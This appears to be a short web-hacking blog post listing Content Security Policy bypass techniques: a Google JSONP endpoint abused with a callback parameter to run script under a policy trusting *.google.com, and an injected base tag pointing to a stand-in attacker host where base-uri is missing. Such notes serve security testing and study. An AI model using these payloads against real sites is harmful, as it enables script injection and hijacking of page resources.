---
title: Content Security Policy (CSP) Bypass
author: janger
date: 2023-09-25
category: Web Hacking
layout: post
---

## Google JSONP API CSP Bypass

If the target server is accepting addresses from Google, use the

~~~
Content-Security-Policy: default-src 'self'; script-src *.google.com
~~~

~~~ html
<html>
    <head>...</head>
    <body>
        <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"></script>
    </body>
</html>
~~~


## missing base-uri

~~~ html
<base href="https://attacker.io/">
~~~
